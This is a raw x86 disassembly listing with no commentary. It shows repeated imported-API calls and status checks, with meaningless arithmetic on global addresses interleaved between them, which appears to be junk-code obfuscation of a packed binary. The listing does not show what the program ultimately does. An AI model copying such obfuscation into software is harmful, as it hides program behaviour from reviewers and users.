  422ff3:	adc    DWORD PTR ds:0x42b1ee,0x42b1da
  422ffd:	mov    eax,DWORD PTR [eax]
  422fff:	or     DWORD PTR ds:0x42b20e,0x42b1c6
  423009:	mov    DWORD PTR [esp+0x60],eax
  42300d:	not    eax
  42300f:	mov    eax,0xf89c85a1
  423014:	sbb    DWORD PTR ds:0x42b1d2,0xc9c
  42301e:	mov    DWORD PTR [esp+0x10],eax
  423022:	mov    DWORD PTR [esp+0x10],eax
  423026:	sbb    DWORD PTR ds:0x42b222,0x42b21e
  423030:	mov    DWORD PTR [esp+0x10],eax
  423034:	mov    DWORD PTR [esp+0x10],ecx
  423038:	sub    DWORD PTR ds:0x42b22a,0x42b1ce
  423042:	mov    DWORD PTR [esp+0x20],eax
  423046:	mov    DWORD PTR [esp+0x20],0xf89c85bd
  42304e:	and    DWORD PTR ds:0x42b1aa,0x45c4
  423058:	mov    eax,DWORD PTR [esp+0x18]
  42305c:	add    DWORD PTR ds:0x42b1c2,0x42b18a
  423066:	xor    eax,edi
  423068:	add    eax,ebx
  42306a:	jmp    0x4231b3
  42306f:	or     DWORD PTR ds:0x42b21a,0x42b18e
  423079:	lea    eax,[esp+0x1b8]
  423080:	push   eax
  423081:	push   0x42a646
  423086:	call   DWORD PTR ds:0x42b312
  42308c:	mov    DWORD PTR ds:0x42b1e2,0x6a7b
  423096:	cmp    eax,0xffffffff
  423099:	mov    DWORD PTR ds:0x42b1be,0xa85
  4230a3:	jne    0x422c5a
  4230a9:	xor    DWORD PTR ds:0x42b1ee,0x42b19a
  4230b3:	push   0xf
  4230b5:	sub    DWORD PTR ds:0x42b1c6,0x42b1a6
  4230bf:	lea    eax,[esp+0x44]
  4230c3:	push   eax
  4230c4:	push   0x42a67a
  4230c9:	push   0x42a68e
  4230ce:	add    DWORD PTR ds:0x42b1ce,0x42b22a
  4230d8:	push   0x42a6b2
  4230dd:	dec    DWORD PTR ds:0x42b1f2
  4230e3:	call   esi
  4230e5:	imul   eax,eax,0x300000
  4230eb:	cmp    eax,0x1b00000
  4230f0:	jne    0x422c5a
  4230f6:	sbb    DWORD PTR ds:0x42b1be,0x817
  423100:	lea    eax,[esp+0x78]
  423104:	push   eax
  423105:	or     DWORD PTR ds:0x42b18e,0x42b1e2
  42310f:	push   0xffffffff
  423111:	add    DWORD PTR ds:0x42b1d6,0x42b18a
  42311b:	call   DWORD PTR ds:0x42b30a
  423121:	xor    DWORD PTR ds:0x42b1fe,0x42b19e
  42312b:	test   eax,eax
  42312d:	mov    DWORD PTR ds:0x42b20e,0x786b
  423137:	jne    0x422c5a
  42313d:	mov    eax,DWORD PTR [esp+0xc]
  423141:	mov    ecx,DWORD PTR [esp+0x20]
  423145:	or     DWORD PTR ds:0x42b1fa,0x5b03
  42314f:	xor    eax,edi
  423151:	and    DWORD PTR ds:0x42b182,0x42b1da
  42315b:	lea    eax,[eax+ecx*1+0x3272f5]
  423162:	push   eax
  423163:	sub    DWORD PTR ds:0x42b1fe,ecx
  423169:	mov    eax,DWORD PTR [esp+0x14]
  42316d:	xor    eax,edi
  42316f:	lea    eax,[ebp+eax*1+0x3272fd]
  423176:	add    DWORD PTR ds:0x42b212,0x505
  423180:	push   eax
  423181:	adc    eax,0xe25
  423186:	mov    eax,ds:0x42a472
  42318b:	push   DWORD PTR [eax+0x1bc]
  423191:	and    DWORD PTR ds:0x42b186,0x42b1b6
  42319b:	call   0x423df0
  4231a0:	mov    eax,DWORD PTR [esp+0xc]
  4231a4:	neg    edx
  4231a6:	mov    ecx,DWORD PTR [esp+0x20]
  4231aa:	xor    eax,edi
  4231ac:	lea    eax,[ecx+eax*1+0x3272f5]
  4231b3:	adc    ecx,DWORD PTR ds:0x42b1fa
  4231b9:	mov    ecx,DWORD PTR [esp+0xc]
  4231bd:	add    DWORD PTR ds:0x42b1ce,edi
  4231c3:	mov    edx,DWORD PTR [esp+0xc]
  4231c7:	and    DWORD PTR ds:0x42b1aa,0x42b186
  4231d1:	xor    edx,edi
  4231d3:	xor    ecx,edi
  4231d5:	not    DWORD PTR ds:0x42b1e6
  4231db:	add    ecx,edx
  4231dd:	mov    edx,DWORD PTR ds:0x42b20a
  4231e3:	and    DWORD PTR ds:0x42b222,edx
  4231e9:	mov    edx,DWORD PTR [esp+0xc]
  4231ed:	xor    edx,edi
  4231ef:	mov    DWORD PTR ds:0x42b182,0x14ab
  4231f9:	lea    ecx,[ecx+edx*1+0x9758df]
  423200:	mov    DWORD PTR ds:0x42b1e2,0x2305
  42320a:	mov    DWORD PTR [esp+0x20],eax
  42320e:	cmp    eax,ecx
  423210:	jbe    0x42306f
  423216:	xor    eax,ecx
  423218:	mov    eax,DWORD PTR [ebp+0xc]
  42321b:	adc    DWORD PTR ds:0x42b186,edi
  423221:	mov    ds:0x42a2f6,eax
  423226:	mov    ecx,DWORD PTR ds:0x42b1fe
  42322c:	adc    DWORD PTR ds:0x42b1f2,ecx
  423232:	mov    eax,DWORD PTR [ebp+0x10]
  423235:	inc    ecx
  423236:	mov    ds:0x42a552,eax
  42323b:	mov    eax,ds:0x42a2f6
  423240:	and    DWORD PTR ds:0x42b1b6,ebx
  423246:	mov    ecx,DWORD PTR [esp+0x30]
  42324a:	sub    eax,ebx
  42324c:	sbb    DWORD PTR ds:0x42b1be,0x1289
  423256:	xor    eax,edi
  423258:	xor    DWORD PTR ds:0x42b216,0x69d8
  423262:	mov    DWORD PTR [ecx],eax
  423264:	sub    DWORD PTR ds:0x42b1fe,0x6484
  42326e:	lea    eax,[esp+0x2c]
  423272:	mov    DWORD PTR [esp+0x6c],eax
  423276:	lea    eax,[ebp+0x4]
  423279:	sbb    DWORD PTR ds:0x42b1ba,0x4eab
  423283:	mov    DWORD PTR [esp+0x2c],eax
  423287:	lea    eax,[esp+0x1b8]
  42328e:	push   eax
  42328f:	xor    DWORD PTR ds:0x42b1b2,0x3d91
  423299:	push   0x42a6e2
  42329e:	mov    DWORD PTR ds:0x42b20e,0x4af0
  4232a8:	call   DWORD PTR ds:0x42b312
  4232ae:	cmp    eax,0xffffffff
  4232b1:	jne    0x422c5a
  4232b7:	push   0xf
  4232b9:	lea    eax,[esp+0x44]
  4232bd:	sub    DWORD PTR ds:0x42b20e,0x42b18a
  4232c7:	push   eax
  4232c8:	or     DWORD PTR ds:0x42b1ba,0x144a
  4232d2:	push   0x42a716
  4232d7:	push   0x42a72a
  4232dc:	sbb    DWORD PTR ds:0x42b1ba,0x42b182
  4232e6:	push   0x42a74e
  4232eb:	xor    DWORD PTR ds:0x42b19e,0x42b1fe
  4232f5:	call   esi
  4232f7:	imul   eax,eax,0x300000
  4232fd:	mov    DWORD PTR ds:0x42b1fa,0x26c3
  423307:	cmp    eax,0x1b00000
  42330c:	mov    DWORD PTR ds:0x42b19a,0x6081
  423316:	jne    0x422c5a
  42331c:	lea    eax,[esp+0x78]
  423320:	push   eax
  423321:	push   0xffffffff
  423323:	and    DWORD PTR ds:0x42b1e6,0x42b1aa
  42332d:	call   DWORD PTR ds:0x42b30a
  423333:	sbb    DWORD PTR ds:0x42b19a,0x42b1f6
  42333d:	test   eax,eax
  42333f:	mov    DWORD PTR ds:0x42b1a2,0x6ec1
  423349:	jne    0x422c5a
  42334f:	sub    DWORD PTR ds:0x42b1b2,0x1fda
  423359:	lea    eax,[esp+0x1b8]
  423360:	sbb    DWORD PTR ds:0x42b1fe,0x42b1ee
  42336a:	push   eax
  42336b:	push   0x42a77e
  423370:	adc    DWORD PTR ds:0x42b1f2,0x42b1c6
  42337a:	call   DWORD PTR ds:0x42b312
  423380:	mov    DWORD PTR ds:0x42b19e,0x2ae7
  42338a:	cmp    eax,0xffffffff
  42338d:	jne    0x422c5a
  423393:	adc    DWORD PTR ds:0x42b206,0x701e
  42339d:	push   0xf
  42339f:	lea    eax,[esp+0x44]
  4233a3:	or     DWORD PTR ds:0x42b18e,0x5b00
  4233ad:	push   eax
  4233ae:	push   0x42a7b2
  4233b3:	dec    DWORD PTR ds:0x42b1ba
  4233b9:	push   0x42a7c6
  4233be:	push   0x42a7ea
  4233c3:	sub    DWORD PTR ds:0x42b1e6,0x42b20e
  4233cd:	call   esi
  4233cf:	imul   eax,eax,0x300000
  4233d5:	mov    DWORD PTR ds:0x42b1be,0x6087
  4233df:	cmp    eax,0x1b00000
  4233e4:	mov    DWORD PTR ds:0x42b1d6,0x2e79
  4233ee:	jne    0x422c5a
  4233f4:	lea    eax,[esp+0x78]
  4233f8:	and    DWORD PTR ds:0x42b21e,0x6601
  423402:	push   eax
  423403:	add    DWORD PTR ds:0x42b206,0x4958
  42340d:	push   0xffffffff
  42340f:	and    DWORD PTR ds:0x42b1fa,0x42b1aa
  423419:	call   DWORD PTR ds:0x42b30a
  42341f:	mov    DWORD PTR ds:0x42b222,0x2f7c
  423429:	test   eax,eax
  42342b:	jne    0x422c5a
  423431:	and    DWORD PTR ds:0x42b1e2,0x6b99
  42343b:	lea    eax,[esp+0x1b8]
  423442:	push   eax
  423443:	add    DWORD PTR ds:0x42b22a,0x61ec
  42344d:	push   0x42a81a
  423452:	call   DWORD PTR ds:0x42b312
  423458:	mov    DWORD PTR ds:0x42b1c6,0x2abd
  423462:	cmp    eax,0xffffffff
  423465:	jne    0x422c5a
  42346b:	sbb    DWORD PTR ds:0x42b202,0x42b212
  423475:	push   0xf
  423477:	sub    DWORD PTR ds:0x42b192,0x503c
  423481:	lea    eax,[esp+0x44]
  423485:	push   eax
  423486:	push   0x42a84e
  42348b:	push   0x42a862
  423490:	push   0x42a886
  423495:	call   esi
  423497:	and    DWORD PTR ds:0x42b1c6,0x7bbe
  4234a1:	imul   eax,eax,0x300000
  4234a7:	cmp    eax,0x1b00000
  4234ac:	mov    DWORD PTR ds:0x42b1fe,0x19ae
  4234b6:	jne    0x422c5a
  4234bc:	lea    eax,[esp+0x78]
  4234c0:	push   eax
  4234c1:	neg    DWORD PTR ds:0x42b19e
  4234c7:	push   0xffffffff
  4234c9:	call   DWORD PTR ds:0x42b30a
  4234cf:	sbb    DWORD PTR ds:0x42b1aa,0x42b21e
  4234d9:	test   eax,eax
  4234db:	mov    DWORD PTR ds:0x42b196,0x192f
  4234e5:	jne    0x422c5a
  4234eb:	or     DWORD PTR ds:0x42b186,0x42b22e
  4234f5:	lea    eax,[esp+0x1b8]
  4234fc:	push   eax
  4234fd:	push   0x42a8b6
  423502:	sbb    DWORD PTR ds:0x42b216,0x426f
  42350c:	call   DWORD PTR ds:0x42b312
  423512:	cmp    eax,0xffffffff
  423515:	mov    DWORD PTR ds:0x42b18e,0x3e1f
  42351f:	jne    0x422c5a
  423525:	push   0xf
  423527:	or     DWORD PTR ds:0x42b182,0x42b1da
  423531:	lea    eax,[esp+0x44]
  423535:	push   eax
  423536:	push   0x42a8ea
  42353b:	xor    DWORD PTR ds:0x42b226,0x42b20a
  423545:	push   0x42a8fe
  42354a:	sub    DWORD PTR ds:0x42b226,0x42b22a
  423554:	push   0x42a922
  423559:	add    DWORD PTR ds:0x42b216,0x42b1d6
  423563:	call   esi
  423565:	add    DWORD PTR ds:0x42b1f6,0x38e
  42356f:	imul   eax,eax,0x300000
  423575:	mov    DWORD PTR ds:0x42b19a,0x2257
  42357f:	cmp    eax,0x1b00000
  423584:	mov    DWORD PTR ds:0x42b21a,0x2a1a
  42358e:	jne    0x422c5a
  423594:	adc    DWORD PTR ds:0x42b206,0x42b1a6
  42359e:	lea    eax,[esp+0x78]
  4235a2:	or     DWORD PTR ds:0x42b22e,0x42b1ca
  4235ac:	push   eax
  4235ad:	push   0xffffffff
  4235af:	call   DWORD PTR ds:0x42b30a
  4235b5:	and    DWORD PTR ds:0x42b182,0x42b1a6
  4235bf:	test   eax,eax
  4235c1:	mov    DWORD PTR ds:0x42b1aa,0x4002
  4235cb:	jne    0x422c5a
  4235d1:	dec    DWORD PTR ds:0x42b212
  4235d7:	lea    eax,[esp+0x1b8]
  4235de:	dec    DWORD PTR ds:0x42b18e
  4235e4:	push   eax
  4235e5:	or     DWORD PTR ds:0x42b1ea,0x42b212
  4235ef:	push   0x42a952
  4235f4:	add    DWORD PTR ds:0x42b202,0x42b216
  4235fe:	call   DWORD PTR ds:0x42b312
  423604:	cmp    eax,0xffffffff
  423607:	mov    DWORD PTR ds:0x42b212,0x6bd3
  423611:	jne    0x422c5a
  423617:	push   0xf
  423619:	add    DWORD PTR ds:0x42b1da,0x37be
  423623:	lea    eax,[esp+0x44]
  423627:	xor    DWORD PTR ds:0x42b216,0x42b21e
  423631:	push   eax
  423632:	push   0x42a986
  423637:	sub    DWORD PTR ds:0x42b1be,0x5164
  423641:	push   0x42a99a
  423646:	push   0x42a9be
  42364b:	or     DWORD PTR ds:0x42b182,0x42b21e
  423655:	call   esi
  423657:	and    DWORD PTR ds:0x42b20e,0x1f3e
  423661:	imul   eax,eax,0x300000
  423667:	mov    DWORD PTR ds:0x42b1ee,0x7e45
  423671:	cmp    eax,0x1b00000
  423676:	jne    0x422c5a
  42367c:	add    DWORD PTR ds:0x42b182,0x42b1b2
  423686:	lea    eax,[esp+0x78]
  42368a:	sub    DWORD PTR ds:0x42b1c6,0x42b1a6
  423694:	push   eax
  423695:	sbb    DWORD PTR ds:0x42b1b2,0x42b18a
  42369f:	push   0xffffffff
  4236a1:	adc    DWORD PTR ds:0x42b212,0x32d0
  4236ab:	call   DWORD PTR ds:0x42b30a
  4236b1:	or     DWORD PTR ds:0x42b1f2,0x42b1fe
  4236bb:	test   eax,eax
  4236bd:	jne    0x422c5a
  4236c3:	and    DWORD PTR ds:0x42b186,0x42b1fa
  4236cd:	lea    eax,[esp+0x1b8]
  4236d4:	xor    DWORD PTR ds:0x42b202,0x42b1fa
  4236de:	push   eax
  4236df:	push   0x42a9ee
  4236e4:	call   DWORD PTR ds:0x42b312
  4236ea:	mov    DWORD PTR ds:0x42b1ea,0x2426
  4236f4:	cmp    eax,0xffffffff
  4236f7:	mov    DWORD PTR ds:0x42b20a,0x3daf
  423701:	jne    0x422c5a
  423707:	sub    DWORD PTR ds:0x42b1e6,0x42b22a
  423711:	push   0xf
  423713:	adc    DWORD PTR ds:0x42b1ee,0x42b20a
  42371d:	lea    eax,[esp+0x44]
  423721:	and    DWORD PTR ds:0x42b20a,0x3b25
  42372b:	push   eax
  42372c:	push   0x42aa22
  423731:	sub    DWORD PTR ds:0x42b1fe,0x42b21e
  42373b:	push   0x42aa36
  423740:	mov    DWORD PTR ds:0x42b1fa,0x4cb4
  42374a:	push   0x42aa5a
  42374f:	call   esi
  423751:	inc    DWORD PTR ds:0x42b1a2
  423757:	imul   eax,eax,0x300000
  42375d:	cmp    eax,0x1b00000
  423762:	mov    DWORD PTR ds:0x42b1ea,0x7ee6
  42376c:	jne    0x422c5a
  423772:	or     DWORD PTR ds:0x42b1ea,0x7d0f
  42377c:	lea    eax,[esp+0x78]
  423780:	mov    DWORD PTR ds:0x42b1aa,0x7d0c
  42378a:	push   eax
  42378b:	adc    DWORD PTR ds:0x42b1aa,0x4970
  423795:	push   0xffffffff
  423797:	and    DWORD PTR ds:0x42b212,0x37c9
  4237a1:	call   DWORD PTR ds:0x42b30a
  4237a7:	sbb    DWORD PTR ds:0x42b21e,0x7cde
  4237b1:	test   eax,eax
  4237b3:	mov    DWORD PTR ds:0x42b206,0x64c2
  4237bd:	jne    0x422c5a
  4237c3:	sub    DWORD PTR ds:0x42b1c6,0x42b182
  4237cd:	lea    eax,[esp+0x1b8]
  4237d4:	add    DWORD PTR ds:0x42b19e,0x42b1ee
  4237de:	push   eax
  4237df:	and    DWORD PTR ds:0x42b212,0x42b1de
  4237e9:	push   0x42aa8a
  4237ee:	sbb    DWORD PTR ds:0x42b20e,0x42b1fe
  4237f8:	call   DWORD PTR ds:0x42b312
  4237fe:	mov    DWORD PTR ds:0x42b222,0x5e52
  423808:	cmp    eax,0xffffffff
  42380b:	mov    DWORD PTR ds:0x42b19a,0x4e9b
  423815:	jne    0x422c5a
  42381b:	or     DWORD PTR ds:0x42b1a6,0x4b96
  423825:	push   0xf
  423827:	lea    eax,[esp+0x44]
  42382b:	or     DWORD PTR ds:0x42b22e,0x42b192
  423835:	push   eax
  423836:	push   0x42aabe
  42383b:	push   0x42aad2
  423840:	push   0x42aaf6
  423845:	add    DWORD PTR ds:0x42b216,0x42b1ee
  42384f:	call   esi
  423851:	xor    DWORD PTR ds:0x42b1e2,0x982
  42385b:	imul   eax,eax,0x300000
  423861:	mov    DWORD PTR ds:0x42b1aa,0x5061
  42386b:	cmp    eax,0x1b00000
  423870:	jne    0x422c5a
  423876:	lea    eax,[esp+0x78]
  42387a:	xor    DWORD PTR ds:0x42b1fa,0x42b1ee
  423884:	push   eax
  423885:	push   0xffffffff
  423887:	call   DWORD PTR ds:0x42b30a
  42388d:	test   eax,eax
  42388f:	jne    0x422c5a
  423895:	add    DWORD PTR ds:0x42b21e,0x42b1ce
  42389f:	lea    eax,[esp+0x1b8]
  4238a6:	push   eax
  4238a7:	adc    DWORD PTR ds:0x42b1fe,0x6ad9
  4238b1:	push   0x42ab26
  4238b6:	or     DWORD PTR ds:0x42b1d6,0x42b1be
  4238c0:	call   DWORD PTR ds:0x42b312
  4238c6:	mov    DWORD PTR ds:0x42b216,0x33dc
  4238d0:	cmp    eax,0xffffffff
  4238d3:	mov    DWORD PTR ds:0x42b182,0x32d8
  4238dd:	jne    0x422c5a
  4238e3:	add    DWORD PTR ds:0x42b1b6,0x3dc0
  4238ed:	push   0xf
  4238ef:	lea    eax,[esp+0x44]
  4238f3:	xor    DWORD PTR ds:0x42b19a,0x42b1ce
  4238fd:	push   eax
  4238fe:	push   0x42ab5a
  423903:	add    DWORD PTR ds:0x42b1e6,0x62a8
  42390d:	push   0x42ab6e
  423912:	push   0x42ab92
  423917:	xor    DWORD PTR ds:0x42b19e,0x23c8
  423921:	call   esi
  423923:	xor    DWORD PTR ds:0x42b226,0x14f0
  42392d:	imul   eax,eax,0x300000
  423933:	mov    DWORD PTR ds:0x42b1ea,0x193b
  42393d:	cmp    eax,0x1b00000
  423942:	mov    DWORD PTR ds:0x42b1ee,0x7050
  42394c:	jne    0x422c5a
  423952:	or     DWORD PTR ds:0x42b1ce,0x3f0
  42395c:	lea    eax,[esp+0x78]
  423960:	push   eax
  423961:	push   0xffffffff
  423963:	call   DWORD PTR ds:0x42b30a
  423969:	test   eax,eax
  42396b:	jne    0x422c5a
  423971:	lea    eax,[esp+0x1b8]
  423978:	push   eax
  423979:	push   0x42abc2
  42397e:	call   DWORD PTR ds:0x42b312
  423984:	cmp    eax,0xffffffff
  423987:	jne    0x422c5a
  42398d:	push   0xf
  42398f:	lea    eax,[esp+0x44]
  423993:	push   eax
  423994:	push   0x42abf6
  423999:	push   0x42ac0a
  42399e:	push   0x42ac2e
  4239a3:	call   esi
  4239a5:	imul   eax,eax,0x300000
  4239ab:	cmp    eax,0x1b00000
  4239b0:	jne    0x422c5a
  4239b6:	lea    eax,[esp+0x78]
  4239ba:	push   eax
  4239bb:	push   0xffffffff
  4239bd:	call   DWORD PTR ds:0x42b30a
  4239c3:	test   eax,eax
  4239c5:	jne    0x422c5a
  4239cb:	lea    eax,[esp+0x1b8]
  4239d2:	push   eax
  4239d3:	push   0x42ac5e
  4239d8:	call   DWORD PTR ds:0x42b312
  4239de:	cmp    eax,0xffffffff
  4239e1:	jne    0x422c5a
  4239e7:	push   0xf
  4239e9:	lea    eax,[esp+0x44]
  4239ed:	push   eax
  4239ee:	push   0x42ac92
  4239f3:	push   0x42aca6
  4239f8:	push   0x42acca
  4239fd:	call   esi
  4239ff:	imul   eax,eax,0x300000
  423a05:	cmp    eax,0x1b00000
  423a0a:	jne    0x422c5a
  423a10:	lea    eax,[esp+0x78]
  423a14:	push   eax
  423a15:	push   0xffffffff
  423a17:	call   DWORD PTR ds:0x42b30a
  423a1d:	test   eax,eax
  423a1f:	jne    0x422c5a
  423a25:	lea    eax,[esp+0x1b8]
  423a2c:	push   eax
  423a2d:	push   0x42acfa
  423a32:	call   DWORD PTR ds:0x42b312
  423a38:	cmp    eax,0xffffffff
  423a3b:	jne    0x422c5a
  423a41:	push   0xf
  423a43:	lea    eax,[esp+0x44]
  423a47:	push   eax
  423a48:	push   0x42ad2e
  423a4d:	push   0x42ad42
  423a52:	push   0x42ad66
  423a57:	call   esi
  423a59:	imul   eax,eax,0x300000
  423a5f:	cmp    eax,0x1b00000
  423a64:	jne    0x422c5a
  423a6a:	lea    eax,[esp+0x78]
  423a6e:	push   eax
  423a6f:	push   0xffffffff
  423a71:	call   DWORD PTR ds:0x42b30a
  423a77:	test   eax,eax
  423a79:	jne    0x422c5a
  423a7f:	lea    eax,[esp+0x1b8]
  423a86:	push   eax
  423a87:	push   0x42ad96
  423a8c:	call   DWORD PTR ds:0x42b312
  423a92:	cmp    eax,0xffffffff
  423a95:	jne    0x422c5a
  423a9b:	push   0xf
  423a9d:	lea    eax,[esp+0x44]
  423aa1:	push   eax
  423aa2:	push   0x42adca
  423aa7:	push   0x42adde
  423aac:	push   0x42ae02
  423ab1:	call   esi
  423ab3:	imul   eax,eax,0x300000
  423ab9:	cmp    eax,0x1b00000
  423abe:	jne    0x422c5a
  423ac4:	lea    eax,[esp+0x78]
  423ac8:	push   eax
  423ac9:	push   0xffffffff
  423acb:	call   DWORD PTR ds:0x42b30a
  423ad1:	test   eax,eax
  423ad3:	jne    0x422c5a
  423ad9:	mov    eax,DWORD PTR [esp+0x3c]
  423add:	cmp    eax,0xf89c85a2
  423ae2:	je     0x423b41
  423ae8:	mov    eax,DWORD PTR [esp+0x18]
  423aec:	mov    ecx,DWORD PTR [esp+0x38]
  423af0:	xor    eax,edi
  423af2:	add    eax,ebx
  423af4:	cmp    eax,ecx
  423af6:	je     0x423b41
  423afc:	mov    eax,ds:0x42a472
  423b01:	mov    eax,DWORD PTR [eax+0x194]
  423b07:	mov    ecx,DWORD PTR [eax]
  423b09:	mov    eax,DWORD PTR [ecx+0x3c]
  423b0c:	push   DWORD PTR ds:0x42a552
  423b12:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  423b16:	push   DWORD PTR ds:0x42a2f6
  423b1c:	add    eax,ecx
  423b1e:	mov    ecx,DWORD PTR ds:0x42a472
  423b24:	mov    ecx,DWORD PTR [ecx+0x194]
  423b2a:	push   DWORD PTR [ecx]
  423b2c:	call   eax
  423b2e:	mov    ecx,DWORD PTR ds:0x42a472
  423b34:	mov    ecx,DWORD PTR [ecx+0x1cc]
  423b3a:	mov    DWORD PTR [ecx],eax
  423b3c:	jmp    0x423d6c
  423b41:	mov    eax,DWORD PTR [esp+0x18]
  423b45:	mov    ecx,DWORD PTR [esp+0x60]
  423b49:	xor    eax,edi
  423b4b:	add    eax,ebx
  423b4d:	cmp    eax,ecx
  423b4f:	jne    0x423bba
  423b55:	mov    eax,DWORD PTR [esp+0x18]
  423b59:	mov    ecx,DWORD PTR ds:0x42a472
  423b5f:	mov    ecx,DWORD PTR [ecx+0x198]
  423b65:	xor    eax,edi
  423b67:	add    eax,ebx
  423b69:	cmp    eax,DWORD PTR [ecx]
  423b6b:	jne    0x423b93
  423b71:	mov    eax,DWORD PTR [esp+0x18]
  423b75:	push   0xffffffff
  423b77:	push   0x70941f95
  423b7c:	xor    eax,edi
  423b7e:	add    eax,ebx
  423b80:	push   eax
  423b81:	push   0xf89c85a1
  423b86:	push   DWORD PTR [esp+0x1c]
  423b8a:	push   DWORD PTR [esp+0x2c]
  423b8e:	call   0x4224d2
  423b93:	push   DWORD PTR [esp+0xc]
  423b97:	push   DWORD PTR [esp+0x1c]
  423b9b:	call   0x401000
  423ba0:	mov    eax,DWORD PTR [esp+0x18]
  423ba4:	xor    eax,edi
  423ba6:	add    eax,ebx
  423ba8:	mov    ds:0x42a4fe,eax
  423bad:	mov    eax,DWORD PTR [esp+0x18]
  423bb1:	xor    eax,edi
  423bb3:	add    eax,ebx
  423bb5:	mov    ds:0x42a4f6,eax
  423bba:	mov    eax,DWORD PTR [esp+0x2c]
  423bbe:	test   eax,eax
  423bc0:	je     0x423d6c
  423bc6:	lea    eax,[esp+0x1b8]
  423bcd:	mov    DWORD PTR [esp+0x64],0xf152c3a
  423bd5:	push   eax
  423bd6:	mov    DWORD PTR [esp+0x78],0x712ed2f
  423bde:	mov    DWORD PTR [esp+0x74],0x373fc0d
  423be6:	push   0x42ae32
  423beb:	mov    DWORD PTR [esp+0x70],0x72670add
  423bf3:	call   DWORD PTR ds:0x42b312
  423bf9:	cmp    eax,0xffffffff
  423bfc:	jne    0x422c5a
  423c02:	push   0xf
  423c04:	lea    eax,[esp+0x44]
  423c08:	push   eax
  423c09:	push   0x42ae66
  423c0e:	push   0x42ae7a
  423c13:	push   0x42ae9e
  423c18:	call   esi
  423c1a:	imul   eax,eax,0x300000
  423c20:	cmp    eax,0x1b00000
  423c25:	jne    0x422c5a
  423c2b:	lea    eax,[esp+0x78]
  423c2f:	push   eax
  423c30:	push   0xffffffff
  423c32:	call   DWORD PTR ds:0x42b30a
  423c38:	test   eax,eax
  423c3a:	jne    0x422c5a
  423c40:	call   0x41b628
  423c45:	mov    eax,DWORD PTR [esp+0x34]
  423c49:	mov    eax,DWORD PTR [esp+0xc]
  423c4d:	mov    DWORD PTR [esp+0x30],eax
  423c51:	mov    eax,DWORD PTR [esp+0x18]
  423c55:	mov    DWORD PTR [esp+0xc],eax
  423c59:	mov    eax,eax
  423c5b:	mov    eax,ds:0x42a472
  423c60:	mov    ecx,DWORD PTR [eax+0x1c0]
  423c66:	mov    edx,DWORD PTR [ecx]
  423c68:	and    DWORD PTR [esp+0x14],0x0
  423c6d:	mov    esi,0xfabdbed4
  423c72:	add    edx,esi
  423c74:	adc    DWORD PTR [esp+0x14],0xffffffff
  423c79:	mov    ecx,0x8a29a141
  423c7e:	xor    edx,ecx
  423c80:	mov    DWORD PTR [esp+0x20],edx
  423c84:	mov    edx,DWORD PTR [esp+0x14]
  423c88:	xor    edx,0x0
  423c8b:	cmp    DWORD PTR [esp+0x20],0x70941f94
  423c93:	mov    DWORD PTR [esp+0x24],edx
  423c97:	jne    0x423ca6
  423c9d:	cmp    edx,0xffffffff
  423ca0:	je     0x423d0f
  423ca6:	mov    eax,DWORD PTR [eax+0x1c8]
  423cac:	mov    eax,DWORD PTR [eax]
  423cae:	cdq    
  423caf:	add    eax,esi
  423cb1:	adc    edx,0xffffffff
  423cb4:	and    DWORD PTR [esp+0x14],0x0
  423cb9:	xor    edx,0x0
  423cbc:	mov    DWORD PTR [esp+0x1c],edx
  423cc0:	mov    edx,DWORD PTR [esp+0xc]
  423cc4:	mov    DWORD PTR [esp+0x10],edx
  423cc8:	xor    eax,ecx
  423cca:	add    DWORD PTR [esp+0x10],esi
  423cce:	mov    edx,DWORD PTR [esp+0x10]
  423cd2:	adc    DWORD PTR [esp+0x14],0xffffffff
  423cd7:	xor    edx,ecx
  423cd9:	mov    DWORD PTR [esp+0x20],edx
  423cdd:	mov    edx,DWORD PTR [esp+0x14]
  423ce1:	xor    edx,0x0
  423ce4:	mov    DWORD PTR [esp+0x24],edx
  423ce8:	cmp    DWORD PTR [esp+0x20],eax
  423cec:	jne    0x423cfe
  423cf2:	mov    eax,DWORD PTR [esp+0x1c]
  423cf6:	cmp    edx,eax
  423cf8:	je     0x423d0f
  423cfe:	mov    eax,DWORD PTR [esp+0xc]
  423d02:	add    eax,DWORD PTR [esp+0x30]
  423d06:	mov    DWORD PTR [esp+0xc],eax
  423d0a:	jmp    0x423d6c
  423d0f:	mov    eax,ds:0x42a4f6
  423d14:	mov    edx,DWORD PTR ds:0x42a4fe
  423d1a:	xor    eax,edx
  423d1c:	mov    ds:0x42a4f6,eax
  423d21:	mov    edx,DWORD PTR ds:0x42a4f6
  423d27:	mov    eax,DWORD PTR [esp+0x2c]
  423d2b:	add    DWORD PTR [eax],edx
  423d2d:	mov    edx,DWORD PTR [esp+0xc]
  423d31:	mov    eax,ds:0x42a4f6
  423d36:	xor    edx,edi
  423d38:	add    edx,ebx
  423d3a:	xor    ebx,ebx
  423d3c:	add    edx,esi
  423d3e:	adc    ebx,0xffffffff
  423d41:	xor    edi,edi
  423d43:	xor    edx,ecx
  423d45:	xor    ebx,0x0
  423d48:	add    eax,esi
  423d4a:	adc    edi,0xffffffff
  423d4d:	xor    eax,ecx
  423d4f:	xor    edi,0x0
  423d52:	cmp    eax,edx
  423d54:	jne    0x423d6c
  423d5a:	cmp    edi,ebx
  423d5c:	jne    0x423d6c
  423d62:	mov    eax,ds:0x42a4f6
  423d67:	mov    ds:0x42a4fe,eax
  423d6c:	lea    eax,[esp+0x1b8]
  423d73:	push   eax
  423d74:	push   0x42aece
  423d79:	call   DWORD PTR ds:0x42b312
  423d7f:	cmp    eax,0xffffffff
  423d82:	jne    0x422c5a
  423d88:	push   0xf
  423d8a:	lea    eax,[esp+0x44]
  423d8e:	push   eax
  423d8f:	push   0x42af02
  423d94:	push   0x42af16
  423d99:	push   0x42af3a
  423d9e:	call   DWORD PTR ds:0x42b302
  423da4:	imul   eax,eax,0x300000
  423daa:	cmp    eax,0x1b00000
  423daf:	jne    0x422c5a
  423db5:	lea    eax,[esp+0x78]
  423db9:	push   eax
  423dba:	push   0xffffffff
  423dbc:	call   DWORD PTR ds:0x42b30a
  423dc2:	test   eax,eax
  423dc4:	jne    0x422c5a
  423dca:	mov    eax,ds:0x42a472
  423dcf:	push   0x4
  423dd1:	add    eax,0x1cc
  423dd6:	push   eax
  423dd7:	lea    eax,[esp+0x3c]
  423ddb:	push   eax
  423ddc:	call   0x423df0
  423de1:	mov    eax,DWORD PTR [esp+0x34]
  423de5:	mov    eax,DWORD PTR [eax]
  423de7:	pop    edi
  423de8:	pop    esi
  423de9:	pop    ebx
  423dea:	mov    esp,ebp
